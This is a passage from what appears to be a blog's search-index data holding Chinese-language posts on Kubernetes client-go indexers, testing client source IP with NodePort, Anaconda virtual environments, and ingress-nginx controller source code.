*threadSafeMap) Resync() error { // Nothing to do  return nil } func NewThreadSafeStore(indexers Indexers, indices Indices) ThreadSafeStore { return \u0026amp;threadSafeMap{ items: map[string]interface{}{}, indexers: indexers, indices: indices, } }   -store -\u0026gt; threadSafeMap 通过 updateIndices、deleteFromIndices方法来更新或删除本地存储的obj和索引器\n说明 索引键和对象键是两个重要概念\n indexkey: 索引键是用于对象快速查找的，经过索引建在map中排序查找会更快； objkey: 对象键是为对象在存储中的唯一命名的，对象是通过名字+对象的方式存储的。默认格式为：namespace/name  kubernetes中主要的索引函数，最主要的索引的函数大概就下面几种：\n MetaNamespaceIndexFunc，定义在client-go/tools/cache/index.go中，从名字看就是获取对象元数据的namesapce字段，也就是所有对象以namespace作为索引键，这个就很好理解了； indexByPodNodeName，定义在kubernetes/pkg/controller/daemon/deamon_controller.go，该索引函数计算的是Pod对象所在节点的名字； 为了方便理解，我们可以假设kubernetes主要就是一种索引函数（MetaNamespaceIndexFunc），也就是在索引中大部分就一个分类，这个分类的索引键就是namesapce。那么有人肯定会问，如果这样的话，所有的对象都存在一个namesapce索引键下面，这样的效率岂不是太低了?其实client-go为每类对象都创建了Informer(Informer内有Indexer)，所以即便存储在相同namesapce下的对象都是同一类，这个问题自然也就没有了，详情可以看我针对Informer写的文章。  注意：一定要区分MetaNamespaceIndexFunc和MetaNamespaceKeyFunc的区分，第一个索引键计算函数，第二个是对象键计算函数，第一个返回的是namespace，第二个返回的是对象包含namespace在内的对象全称。 所有的对象(Pod、Node、Service等等)都是有属性/标签的，如果属性/标签就是索引键，Indexer就会把相同属性/标签的所有对象放在一个集合中，如果在对属性/标签分一下类，也就就是我们本文的将的Indexer的核心内容了。甚至你可以简单的理解为Indexer就是简单的把相同namesapce对象放在一个集合中，kubernetes就是基于属性/标签/注解来检索的\n参考资料  client-go源码分析\u0026ndash;informer机制流程分析 深入浅出kubernetes之client-go的Indexer 深入浅出kubernetes之client-go的DeltaFIFO 深入浅出kubernetes之client-go的SharedInformer k8s-sample-controller ","permalink":"http://bingerambo.com/posts/2021/08/k8s-go-client-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"K8S go-client 源码分析"},{"categories":["K8S"],"contents":"一种测试验证K8S获取客户端ip[client ip]的方法\n测试方法 部署source-ip-app source-ip-deploy-svc.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  apiVersion:apps/v1kind:Deploymentmetadata:labels:name:source-ipname:source-ip-controllerspec:replicas:1selector:matchLabels:name:source-iptemplate:metadata:labels:name:source-ipspec:containers:# - image: gcr.io/google_containers/echoserver:1.4# - image: cilium/echoserver:latest- image:digiboy2008/echoserver:1.4name:source-ipimagePullPolicy:IfNotPresent---apiVersion:v1kind:Servicemetadata:name:source-iplabels:name:source-ipspec:type:NodePortports:- port:80nodePort:31999targetPort:8080protocol:TCPname:httpselector:name:source-ipexternalTrafficPolicy:LocalsessionAffinity:ClientIP  create source-ip-deploy-svc\n1  kubectl create -f source-ip-deploy-svc.yaml   查看source-ip-svc服务\n1  kubectl describe svc source-ip   获取客户端ip，在终端浏览器输入\n1 2 3  # http://node_ip:node_port/ http://192.168.1.111:31999/   显示内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Hostname: source-ip-controller-548bd49748-pmb6j Pod Information: -no pod information available- Server values: server_version=nginx: 1.13.3 - lua: 10008 Request Information: client_address=::ffff:192.168.1.111 method=GET real path=/ query= request_version=1.1 request_scheme=http request_uri=http://192.168.1.111:8080/ Request Headers: accept=*/* host=192.168.1.111:31999 user-agent=curl/7.65.2 Request Body: -no body in request-   删除source-ip-app 1  kubectl delete -f source-ip-deploy-svc.yaml   参考资料  source-ip官方文档 kubernetes的源地址保持(source IP preserve) 几种在 Kubernetes 集群中获取客户端真实 IP 的方法 k8s nginx应用-获取客户端访问真实IP k8s容器获取客户端真实ip配置 访问Kubernetes Service时的客户端源IP问题 kubernetes的源地址保持(source IP preserve) Kubernetes(二十三)Service(二)会话保持和获取客户端的ip ","permalink":"http://bingerambo.com/posts/2021/07/k8s%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AFipclient-ip%E6%96%B9%E6%B3%95/","tags":["K8S"],"title":"K8S获取客户端ip[client ip]方法"},{"categories":["Python"],"contents":"Anaconda是一个打包的集合，里面预装好了conda、某个版本的python、各种packages如：numpy，pandas，scipy，scikit-learn等。 conda将几乎所有的工具、第三方包都当作package进行管理，甚至包括python 和conda自身。\n1.安装Anaconda 下载相应版本Anaconda\n或者打开Anaconda powershell prompt shell窗口\n打开命令行输入conda -V检验是否安装及当前conda的版本。\n2.conda常用的命令 windows下，还需把安装路径anaconda3\\Scripts添加到环境变量中\n1)查看安装了哪些包 1  conda list   2)查看当前存在哪些虚拟环境 1 2  conda env list conda info -e   3)检查更新当前conda 1  conda update conda   3.Python创建虚拟环境  conda create -n your_env_name python=x.x anaconda命令创建python版本为x.x，名字为your_env_name的虚拟环境。your_env_name文件可以在Anaconda安装目录envs文件下找到。  1 2  #conda create -n your_env_name python=x.x conda create -n ml_py3.8 python=3.8   创建虚拟环境成功\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  Downloading and Extracting Packages certifi-2021.5.30 | 140 KB | ########## | 100% wheel-0.36.2 | 33 KB | ########## | 100% pip-21.1.1 | 1.8 MB | ########## | 100% openssl-1.1.1k | 4.8 MB | ########## | 100% python-3.8.10 | 15.9 MB | ########## | 100% ca-certificates-2021 | 112 KB | ########## | 100% vc-14.2 | 8 KB | ########## | 100% vs2015_runtime-14.27 | 1007 KB | ########## | 100% wincertstore-0.2 | 15 KB | ########## | 100% setuptools-52.0.0 | 726 KB | ########## | 100% sqlite-3.35.4 | 761 KB | ########## | 100% Preparing transaction: ...working... done Verifying transaction: ...working... done Executing transaction: ...working... done # # To activate this environment, use # # $ conda activate ml_py3.8 # # To deactivate an active environment, use # # $ conda deactivate   4.激活或者切换虚拟环境 打开命令行，输入python \u0026ndash;version检查当前 python 版本。\n Linux: source activate your_env_name Windows: activate your_env_name  1 2 3 4 5 6 7  # Linux #source activate your_env_name source activate ml_py3.8 #Windows #activate your_env_name activate ml_py3.8   5.对虚拟环境中安装额外的包 conda install -n your_env_name [package]\n1 2  #conda install -n your_env_name [package] conda install -n ml_py3.8 scikit-learn   6.关闭虚拟环境(即从当前环境退出返回使用PATH环境中的默认python版本)  deactivate env_name 或者activate root切回root环境 Linux下：source deactivate env_name  1 2 3 4 5 6 7 8  #Linux # source deactivate your_env_name source deactivate ml_py3.8 #Windows #activate your_env_name deactivate ml_py3.8    在虚拟爱环境中登出  1  conda deactivate   如下：\n1 2  (ml_py3.8) C:\\Users\\test\u0026gt;conda deactivate C:\\Users\\test\u0026gt;   7.删除虚拟环境 conda remove -n your_env_name \u0026ndash;all\n1 2 3 4  # conda remove -n your_env_name --all conda remove -n ml_py3.8 --all   8.删除环境钟的某个包 conda remove \u0026ndash;name $your_env_name $package_name\n1  conda remove --name $your_env_name $package_name   9.设置国内镜像 http://Anaconda.org的服务器在国外，安装多个packages时，conda下载的速度经常很慢。清华TUNA镜像源有Anaconda仓库的镜像，将其加入conda的配置即可：\n添加Anaconda的TUNA镜像 1  conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/   或者\n1 2 3 4 5 6 7 8 9 10 11 12 13  conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main   TUNA的help中镜像地址加有引号，需要去掉\n设置搜索时显示通道地址 1  conda config --set show_channel_urls yes   10.恢复默认镜像 1  conda config --remove-key channels   问题 在安装conda新环境时，运行：\n1  conda create -n ml_py3.8 python=3.8   出现如下错误：\n1 2 3 4 5 6 7 8 9 10 11 12  An unexpected error has occurred. Conda has prepared the above report. If submitted, this report will be used by core maintainers to improve future releases of conda. Would you like conda to send this report to the core maintainers? [y/N]: N No report sent. To permanently opt-out, use $ conda config --set report_errors false   解决方法：\n 运行conda clean -i清除索引缓存,保证用的是镜像站提供的索引。  1 2 3  conda clean -i   ","permalink":"http://bingerambo.com/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/","tags":["Python"],"title":"Anaconda配置python虚拟环境"},{"categories":["K8S"],"contents":"Ingress概念和原理介绍\n服务访问 内部访问方式 ClusterIP ClusterIP 服务是 Kubernetes 的默认服务。它给你一个集群内的服务，集群内的其它应用都可以访问该服务。集群外部无法访问它。在某些场景下我们可以使用 Kubernetes 的 Proxy 模式来访问服务，比如调试服务时。\n外部访问方式 三种外部访问方式\n1. NodePort NodePort 服务是引导外部流量到你的服务的最原始方式。NodePort，正如这个名字所示，在所有节点（虚拟机）上开放一个特定端口，任何发送到该端口的流量都被转发到对应服务。\nNodePort 服务特征如下：\n 每个端口只能是一种服务 端口范围只能是在apiserver配置的端口范围内：30000-32767（可调） 不在 YAML 配置文件中指定则会分配一个默认端口  2. LoadBalancer LoadBalancer 服务是暴露服务到 Internet 的标准方式。所有通往你指定的端口的流量都会被转发到对应的服务。它没有过滤条件，没有路由等。这意味着你几乎可以发送任何种类的流量到该服务，像 HTTP，TCP，UDP，WebSocket，gRPC 或其它任意种类。\n3. Ingress 通常情况下，Service 和 Pod 的 IP 仅可在集群内部访问。集群外部的请求需要通过负载均衡转发到 Service 在 Node 上暴露的 NodePort 上，然后再由 kube-proxy 通过边缘路由器 (edge router) 将其转发给相关的 Pod 或者丢弃。而 Ingress 就是为进入集群的请求提供路由规则的集合\nIngress原理 Ingress是一种对象（资源）存在于API Server(ETCD)上，它的整个生命周期（创建、更新、销毁）可以被实时的监听 Ingress是对外（公网）服务到集群内的Service之间规则的集合：允许进入集群的请求被转发至集群内的Service Ingress能把Service（Kubernetes的服务）配置成外网能够访问的URL，流量负载均衡，终止SSL，提供于域名访问的虚拟主机等，用户通过访问URL（API资源服务的形式，例如：caas.one/kibana）进入和请求Service，一个Ingress控制器负责处理所有Ingress的请求流量\n详细请看Ingress说明\n 所谓Ingress对象，其实就是k8s 对“反向代理”的一种抽象。 Ingress 的实现分为两个部分 Ingress Controller 和 Ingress。 Ingress Controller 是流量的入口，是一个实体软件， 一般是Nginx 和 Haproxy（较少使用）。 Ingress 描述具体的路由规则。 Ingress Controller 会监听 api server上的 /ingresses 资源 并实时生效。 Ingerss 描述了一个或者多个 域名的路由规则，以 ingress 资源的形式存在。  简单说： Ingress 描述路由规则， Ingress Controller 实时实现规则。\nIngress Controller Ingress Controller 实际上是一个监听 Ingress 对象以及它所代理的后端 Service 变化的控制器。\n以ingress-nginx-controller为例说明\n当一个新的 Ingress 对象由用户创建后，nginx-ingress-controller 就会根据 Ingress 对象里定义的内容，生成一份对应的 Nginx 配置文件（/etc/nginx/nginx.conf），并使用这个配置文件启动一个 Nginx 服务。\n而一旦 Ingress 对象被更新，nginx-ingress-controller 就会更新这个配置文件。需要注意的是，如果这里只是被代理的 Service 对象被更新，nginx-ingress-controller 所管理的 Nginx 服务是不需要重新加载（reload）的。这当然是因为 nginx-ingress-controller 通过Nginx Lua方案实现了 Nginx Upstream 的动态配置。\n此外，nginx-ingress-controller 还允许你通过 Kubernetes 的 ConfigMap 对象来对上述 Nginx 配置文件进行定制。这个 ConfigMap 的名字，需要以参数的方式传递给 nginx-ingress-controller。而你在这个 ConfigMap 里添加的字段，将会被合并到最后生成的 Nginx 配置文件当中。\n一个 Nginx Ingress Controller 提供的服务，其实是一个可以根据 Ingress 对象和被代理后端 Service 的变化，来自动进行更新的 Nginx 负载均衡器。\n注意  Core Sync Logics:\nIngress-nginx has an internal model of the ingresses, secrets and endpoints in a given cluster. It maintains two copy of that (1) currently running configuration model and (2) the one generated in response to some changes in the cluster.\nThe sync logic diffs the two models and if there\u0026rsquo;s a change it tries to converge the running configuration to the new one.\nThere are static and dynamic configuration changes.\nAll endpoints and certificate changes are handled dynamically by posting the payload to an internal NGINX endpoint that is handled by Lua.\n   Ingress Controller 注意事项\n 一个集群中可以有多个 Ingress Controller， 在Ingress 中可以指定使用哪一个Ingress Controller 多个Ingress 规则可能出现竞争 Ingress Controller 本身需要以hostport 或者 service形式暴露出来。 云端可以使用云供应商lb 服务。 Ingress 可以为多个命名空间服务 Ingress只能通过Annotations 进行设置。并且需要确保　Ingress Controller 启动时， 启用了 Annotations 选项 Ingress Controller 放在独立命名空间中， 由管理员来管理。 Ingress 放在各应用的命名空间中， 由应用运维来设置。  Ingress 相关代码 IngressSpec 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127  // IngressSpec describes the Ingress the user wishes to exist. type IngressSpec struct { // IngressClassName is the name of the IngressClass cluster resource. The  // associated IngressClass defines which controller will implement the  // resource. This replaces the deprecated `kubernetes.io/ingress.class`  // annotation. For backwards compatibility, when that annotation is set, it  // must be given precedence over this field. The controller may emit a  // warning if the field and annotation have different values.  // Implementations of this API should ignore Ingresses without a class  // specified. An IngressClass resource may be marked as default, which can  // be used to set a default value for this field. For more information,  // refer to the IngressClass documentation.  // +optional  IngressClassName *string `json:\u0026#34;ingressClassName,omitempty\u0026#34; protobuf:\u0026#34;bytes,4,opt,name=ingressClassName\u0026#34;` // A default backend capable of servicing requests that don\u0026#39;t match any  // rule. At least one of \u0026#39;backend\u0026#39; or \u0026#39;rules\u0026#39; must be specified. This field  // is optional to allow the loadbalancer controller or defaulting logic to  // specify a global default.  // +optional  Backend *IngressBackend `json:\u0026#34;backend,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=backend\u0026#34;` // TLS configuration. Currently the Ingress only supports a single TLS  // port, 443. If multiple members of this list specify different hosts, they  // will be multiplexed on the same port according to the hostname specified  // through the SNI TLS extension, if the ingress controller fulfilling the  // ingress supports SNI.  // +optional  TLS []IngressTLS `json:\u0026#34;tls,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,rep,name=tls\u0026#34;` // A list of host rules used to configure the Ingress. If unspecified, or  // no rule matches, all traffic is sent to the default backend.  // +optional  Rules []IngressRule `json:\u0026#34;rules,omitempty\u0026#34; protobuf:\u0026#34;bytes,3,rep,name=rules\u0026#34;` // TODO: Add the ability to specify load-balancer IP through claims } // IngressTLS describes the transport layer security associated with an Ingress. type IngressTLS struct { // Hosts are a list of hosts included in the TLS certificate. The values in  // this list must match the name/s used in the tlsSecret. Defaults to the  // wildcard host setting for the loadbalancer controller fulfilling this  // Ingress, if left unspecified.  // +optional  Hosts []string `json:\u0026#34;hosts,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,rep,name=hosts\u0026#34;` // SecretName is the name of the secret used to terminate TLS traffic on  // port 443. Field is left optional to allow TLS routing based on SNI  // hostname alone. If the SNI host in a listener conflicts with the \u0026#34;Host\u0026#34;  // header field used by an IngressRule, the SNI host is used for termination  // and value of the Host header is used for routing.  // +optional  SecretName string `json:\u0026#34;secretName,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=secretName\u0026#34;` // TODO: Consider specifying different modes of termination, protocols etc. } // IngressStatus describe the current state of the Ingress. type IngressStatus struct { // LoadBalancer contains the current status of the load-balancer.  // +optional  LoadBalancer v1.LoadBalancerStatus `json:\u0026#34;loadBalancer,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=loadBalancer\u0026#34;` } // IngressRule represents the rules mapping the paths under a specified host to // the related backend services. Incoming requests are first evaluated for a host // match, then routed to the backend associated with the matching IngressRuleValue. type IngressRule struct { // Host is the fully qualified domain name of a network host, as defined by RFC 3986.  // Note the following deviations from the \u0026#34;host\u0026#34; part of the  // URI as defined in RFC 3986:  // 1. IPs are not allowed. Currently an IngressRuleValue can only apply to  // the IP in the Spec of the parent Ingress.  // 2. The `:` delimiter is not respected because ports are not allowed.  // Currently the port of an Ingress is implicitly :80 for http and  // :443 for https.  // Both these may change in the future.  // Incoming requests are matched against the host before the  // IngressRuleValue. If the host is unspecified, the Ingress routes all  // traffic based on the specified IngressRuleValue.  //  // Host can be \u0026#34;precise\u0026#34; which is a domain name without the terminating dot of  // a network host (e.g. \u0026#34;foo.bar.com\u0026#34;) or \u0026#34;wildcard\u0026#34;, which is a domain name  // prefixed with a single wildcard label (e.g. \u0026#34;*.foo.com\u0026#34;).  // The wildcard character \u0026#39;*\u0026#39; must appear by itself as the first DNS label and  // matches only a single label. You cannot have a wildcard label by itself (e.g. Host == \u0026#34;*\u0026#34;).  // Requests will be matched against the Host field in the following way:  // 1. If Host is precise, the request matches this rule if the http host header is equal to Host.  // 2. If Host is a wildcard, then the request matches this rule if the http host header  // is to equal to the suffix (removing the first label) of the wildcard rule.  // +optional  Host string `json:\u0026#34;host,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=host\u0026#34;` // IngressRuleValue represents a rule to route requests for this IngressRule.  // If unspecified, the rule defaults to a http catch-all. Whether that sends  // just traffic matching the host to the default backend or all traffic to the  // default backend, is left to the controller fulfilling the Ingress. Http is  // currently the only supported IngressRuleValue.  // +optional  IngressRuleValue `json:\u0026#34;,inline,omitempty\u0026#34; protobuf:\u0026#34;bytes,2,opt,name=ingressRuleValue\u0026#34;` } // IngressRuleValue represents a rule to apply against incoming requests. If the // rule is satisfied, the request is routed to the specified backend. Currently // mixing different types of rules in a single Ingress is disallowed, so exactly // one of the following must be set. type IngressRuleValue struct { //TODO:  // 1. Consider renaming this resource and the associated rules so they  // aren\u0026#39;t tied to Ingress. They can be used to route intra-cluster traffic.  // 2. Consider adding fields for ingress-type specific global options  // usable by a loadbalancer, like http keep-alive.  // +optional  HTTP *HTTPIngressRuleValue `json:\u0026#34;http,omitempty\u0026#34; protobuf:\u0026#34;bytes,1,opt,name=http\u0026#34;` } // HTTPIngressRuleValue is a list of http selectors pointing to backends. // In the example: http://\u0026lt;host\u0026gt;/\u0026lt;path\u0026gt;?\u0026lt;searchpart\u0026gt; -\u0026gt; backend where // where parts of the url correspond to RFC 3986, this resource will be used // to match against everything after the last \u0026#39;/\u0026#39; and before the first \u0026#39;?\u0026#39; // or \u0026#39;#\u0026#39;. type HTTPIngressRuleValue struct { // A collection of paths that map requests to backends.  Paths []HTTPIngressPath `json:\u0026#34;paths\u0026#34; protobuf:\u0026#34;bytes,1,rep,name=paths\u0026#34;` // TODO: Consider adding fields for ingress-type specific global  // options usable by a loadbalancer, like http keep-alive. }   store store处理资源有：\n Ingress Endpoint Secret ConfigMap Service  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  store.informers.Ingress = infFactory.Networking().V1beta1().Ingresses().Informer() store.listers.Ingress.Store = store.informers.Ingress.GetStore() store.informers.Endpoint = infFactory.Core().V1().Endpoints().Informer() store.listers.Endpoint.Store = store.informers.Endpoint.GetStore() store.informers.Secret = infFactorySecrets.Core().V1().Secrets().Informer() store.listers.Secret.Store = store.informers.Endpoint.GetStore() store.informers.ConfigMap = infFactoryConfigmaps.Core().V1().ConfigMaps().Informer() store.listers.ConfigMap.Store = store.informers.ConfigMap.GetStore() store.informers.Service = infFactory.Core().V1().Services().Informer() store.listers.Service.Store = store.informers.Service.GetStore()   NGINXController NGINXController构造\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179  // NewNGINXController creates a new NGINX Ingress controller. func NewNGINXController(config *Configuration, mc metric.Collector) *NGINXController { eventBroadcaster := record.NewBroadcaster() eventBroadcaster.StartLogging(klog.Infof) eventBroadcaster.StartRecordingToSink(\u0026amp;v1core.EventSinkImpl{ Interface: config.Client.CoreV1().Events(config.Namespace), }) h, err := dns.GetSystemNameServers() if err != nil { klog.Warningf(\u0026#34;Error reading system nameservers: %v\u0026#34;, err) } n := \u0026amp;NGINXController{ isIPV6Enabled: ing_net.IsIPv6Enabled(), resolver: h, cfg: config, syncRateLimiter: flowcontrol.NewTokenBucketRateLimiter(config.SyncRateLimit, 1), recorder: eventBroadcaster.NewRecorder(scheme.Scheme, apiv1.EventSource{ Component: \u0026#34;nginx-ingress-controller\u0026#34;, }), stopCh: make(chan struct{}), updateCh: channels.NewRingChannel(1024), ngxErrCh: make(chan error), stopLock: \u0026amp;sync.Mutex{}, runningConfig: new(ingress.Configuration), Proxy: \u0026amp;TCPProxy{}, metricCollector: mc, command: NewNginxCommand(), } if n.cfg.ValidationWebhook != \u0026#34;\u0026#34; { n.validationWebhookServer = \u0026amp;http.Server{ Addr: config.ValidationWebhook, Handler: adm_controller.NewAdmissionControllerServer(\u0026amp;adm_controller.IngressAdmission{Checker: n}), TLSConfig: ssl.NewTLSListener(n.cfg.ValidationWebhookCertPath, n.cfg.ValidationWebhookKeyPath).TLSConfig(), // disable http/2  // https://github.com/kubernetes/kubernetes/issues/80313  // https://github.com/kubernetes/ingress-nginx/issues/6323#issuecomment-737239159  TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)), } } n.store = store.New( config.Namespace, config.ConfigMapName, config.TCPConfigMapName, config.UDPConfigMapName, config.DefaultSSLCertificate, config.ResyncPeriod, config.Client, n.updateCh, config.DisableCatchAll) n.syncQueue = task.NewTaskQueue(n.syncIngress) if config.UpdateStatus { n.syncStatus = status.NewStatusSyncer(status.Config{ Client: config.Client, PublishService: config.PublishService, PublishStatusAddress: config.PublishStatusAddress, IngressLister: n.store, UpdateStatusOnShutdown: config.UpdateStatusOnShutdown, UseNodeInternalIP: config.UseNodeInternalIP, }) } else { klog.Warning(\u0026#34;Update of Ingress status is disabled (flag --update-status)\u0026#34;) } onTemplateChange := func() { template, err := ngx_template.NewTemplate(nginx.TemplatePath) if err != nil { // this error is different from the rest because it must be clear why nginx is not working  klog.ErrorS(err, \u0026#34;Error loading new template\u0026#34;) return } n.t = template klog.InfoS(\u0026#34;New NGINX configuration template loaded\u0026#34;) n.syncQueue.EnqueueTask(task.GetDummyObject(\u0026#34;template-change\u0026#34;)) } ngxTpl, err := ngx_template.NewTemplate(nginx.TemplatePath) if err != nil { klog.Fatalf(\u0026#34;Invalid NGINX configuration template: %v\u0026#34;, err) } n.t = ngxTpl _, err = watch.NewFileWatcher(nginx.TemplatePath, onTemplateChange) if err != nil { klog.Fatalf(\u0026#34;Error creating file watcher for %v: %v\u0026#34;, nginx.TemplatePath, err) } filesToWatch := []string{} err = filepath.Walk(\u0026#34;/etc/nginx/geoip/\u0026#34;, func(path string, info os.FileInfo, err error) error { if err != nil { return err } if info.IsDir() { return nil } filesToWatch = append(filesToWatch, path) return nil }) if err != nil { klog.Fatalf(\u0026#34;Error creating file watchers: %v\u0026#34;, err) } for _, f := range filesToWatch { _, err = watch.NewFileWatcher(f, func() { klog.InfoS(\u0026#34;File changed detected. Reloading NGINX\u0026#34;, \u0026#34;path\u0026#34;, f) n.syncQueue.EnqueueTask(task.GetDummyObject(\u0026#34;file-change\u0026#34;)) }) if err != nil { klog.Fatalf(\u0026#34;Error creating file watcher for %v: %v\u0026#34;, f, err) } } return n } // NGINXController describes a NGINX Ingress controller. type NGINXController struct { cfg *Configuration recorder record.EventRecorder syncQueue *task.Queue syncStatus status.Syncer syncRateLimiter flowcontrol.RateLimiter // stopLock is used to enforce that only a single call to Stop send at  // a given time. We allow stopping through an HTTP endpoint and  // allowing concurrent stoppers leads to stack traces.  stopLock *sync.Mutex stopCh chan struct{} updateCh *channels.RingChannel // ngxErrCh is used to detect errors with the NGINX processes  ngxErrCh chan error // runningConfig contains the running configuration in the Backend  runningConfig *ingress.Configuration t ngx_template.TemplateWriter resolver []net.IP isIPV6Enabled bool isShuttingDown bool Proxy *TCPProxy store store.Storer metricCollector metric.Collector validationWebhookServer *http.Server command NginxExecTester }   Start()\n store.Run n.syncStatus.Run start(cmd) NGINX启动命令 syncQueue.Run(time.Second, n.stopCh) syncQueue.EnqueueTask(task.GetDummyObject(\u0026ldquo;initial-sync\u0026rdquo;)) 每5分钟 cleanTempNginxCfg() 监听n.updateCh.Out()，进行syncQueue.EnqueueTask处理  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112  // Start starts a new NGINX master process running in the foreground. func (n *NGINXController) Start() { klog.InfoS(\u0026#34;Starting NGINX Ingress controller\u0026#34;) // k8s informer run  n.store.Run(n.stopCh) // we need to use the defined ingress class to allow multiple leaders  // in order to update information about ingress status  electionID := fmt.Sprintf(\u0026#34;%v-%v\u0026#34;, n.cfg.ElectionID, class.DefaultClass) if class.IngressClass != \u0026#34;\u0026#34; { electionID = fmt.Sprintf(\u0026#34;%v-%v\u0026#34;, n.cfg.ElectionID, class.IngressClass) } // 选主 启动 n.syncStatus.Run(stopCh)  setupLeaderElection(\u0026amp;leaderElectionConfig{ Client: n.cfg.Client, ElectionID: electionID, OnStartedLeading: func(stopCh chan struct{}) { if n.syncStatus != nil { go n.syncStatus.Run(stopCh) } n.metricCollector.OnStartedLeading(electionID) // manually update SSL expiration metrics  // (to not wait for a reload)  n.metricCollector.SetSSLExpireTime(n.runningConfig.Servers) }, OnStoppedLeading: func() { n.metricCollector.OnStoppedLeading(electionID) }, }) cmd := n.command.ExecCommand() // put NGINX in another process group to prevent it  // to receive signals meant for the controller  cmd.SysProcAttr = \u0026amp;syscall.SysProcAttr{ Setpgid: true, Pgid: 0, } // SSLPassthrough true 启动本地tcp 代理，不使用nginx  if n.cfg.EnableSSLPassthrough { n.setupSSLProxy() } klog.InfoS(\u0026#34;Starting NGINX process\u0026#34;) n.start(cmd) go n.syncQueue.Run(time.Second, n.stopCh) // force initial sync  // 起始事件 \u0026#34;initial-sync\u0026#34; 入队  n.syncQueue.EnqueueTask(task.GetDummyObject(\u0026#34;initial-sync\u0026#34;)) // In case of error the temporal configuration file will  // be available up to five minutes after the error  go func() { for { time.Sleep(5 * time.Minute) err := cleanTempNginxCfg() if err != nil { klog.ErrorS(err, \u0026#34;Unexpected error removing temporal configuration files\u0026#34;) } } }() if n.validationWebhookServer != nil { klog.InfoS(\u0026#34;Starting validation webhook\u0026#34;, \u0026#34;address\u0026#34;, n.validationWebhookServer.Addr, \u0026#34;certPath\u0026#34;, n.cfg.ValidationWebhookCertPath, \u0026#34;keyPath\u0026#34;, n.cfg.ValidationWebhookKeyPath) go func() { klog.ErrorS(n.validationWebhookServer.ListenAndServeTLS(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;), \u0026#34;Error listening for TLS connections\u0026#34;) }() } for { select { case err := \u0026lt;-n.ngxErrCh: if n.isShuttingDown { return } // if the nginx master process dies, the workers continue to process requests  // until the failure of the configured livenessProbe and restart of the pod.  if process.IsRespawnIfRequired(err) { return } case event := \u0026lt;-n.updateCh.Out(): if n.isShuttingDown { break } if evt, ok := event.(store.Event); ok { klog.V(3).InfoS(\u0026#34;Event received\u0026#34;, \u0026#34;type\u0026#34;, evt.Type, \u0026#34;object\u0026#34;, evt.Obj) if evt.Type == store.ConfigurationEvent { // TODO: is this necessary? Consider removing this special case  n.syncQueue.EnqueueTask(task.GetDummyObject(\u0026#34;configmap-change\u0026#34;)) continue } n.syncQueue.EnqueueSkippableTask(evt.Obj) } else { klog.Warningf(\u0026#34;Unexpected event type received %T\u0026#34;, event) } case \u0026lt;-n.stopCh: return } } }   syncIngress queue sync函数为syncIngress，遍历queue未同步的task进行sync处理，主要内容：\n ings := n.store.ListIngresses() hosts, servers, pcfg := n.getConfiguration(ings), servers是按host来构建的server配置 OnUpdate(*pcfg)，进行nginx config更新，实际上就是比较/etc/nginx/nginx.conf和 new-nginx-cfg是否一样，如果不一样，则按new-nginx-cfg最新的内容更新/etc/nginx/nginx.conf，并执行nginx reload  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 